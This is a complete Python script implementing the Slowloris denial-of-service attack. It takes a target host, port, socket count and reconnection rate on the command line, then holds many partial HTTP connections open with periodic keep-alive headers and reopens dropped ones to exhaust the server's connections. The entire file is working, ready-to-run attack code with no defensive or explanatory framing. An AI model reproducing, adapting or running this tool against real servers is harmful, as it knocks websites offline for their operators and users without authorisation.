#!/usr/bin/env python

# Original slowloris.py version v1.0 written by @wal99d
# v2.0 updates by @brannondorsey

import os
import sys
import random
import socket
import time
import argparse

regular_headers = [
            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Accept-language: en-US,en,q=0.5",
            "Content-type: application/json",
            "Keep-Alive: true",
            ]

def init_socket(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        s.connect((host, port))
    except socket.error as err:
        print("erreur 3: {0}".format(err))
        
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
    for header in regular_headers:
        s.send('{}\r\n'.format(header).encode('UTF-8'))
    return s

def parse_args():
    parser = argparse.ArgumentParser(description='Slowloris DoS attack (python implementation)')
    parser.add_argument('-i', '--host', type=str, required=True, help='target host')
    parser.add_argument('-p', '--port', type=int, required=True,
                        help='target port')
    parser.add_argument('-s', '--max-sockets', dest='max_sockets', type=int, default=100, 
                        help='maximum number of sockets connections to maintain with host')
    parser.add_argument('-r', '--reconnection-rate', dest='reconnection_rate', type=int, default=10,
                        help='seconds before socket reconnections')
    parser.add_argument('-v', '--version', action='version', version='2.0')
    return parser.parse_args()

def main():
    args = parse_args()
    print("[*] try creating {} socket connections...".format(args.max_sockets)) 

    socket_list=[]
    for _ in range(args.max_sockets):
        try:
            s = init_socket(args.host, args.port)
        except socket.error as err:
            print("erreur 3: {0}".format(err))
            break
        socket_list.append(s)
    total_created = len(socket_list)
    print("[+] Actually {} socket connections created".format(len(socket_list))) 

    while True:
        print("[*] sending headers to keep alive {} connections".format(len(socket_list)))
        # send keep-alive headers to open connections
        for s in socket_list:
            try:
                # send custom header with some random bytes
                s.send("Content: {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
            except socket.error as err:
                print("erreur 1: {0}".format(err))
                socket_list.remove(s)

        # reconnect disconnected sockets
        closed = total_created - len(socket_list)
        if closed > 0:
            print('[*] recreating {} new socket connections'.format(closed))
            num_new_connections = 0
            for _ in range(closed):
                try:
                    s=init_socket(args.host, args.port)
                    if s:
                        socket_list.append(s)
                        num_new_connections += 1

                except socket.error as err:
                    print("erreur 2: {0}".format(err))
                    break
            print('[+] {} socket connections created'.format(num_new_connections))
        print('[*] sleeping {} seconds...'.format(args.reconnection_rate))
        time.sleep(args.reconnection_rate)

if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('[!] exiting.')
        try:
            sys.exit(0)
        except SystemExit:
            os._exit(0)
            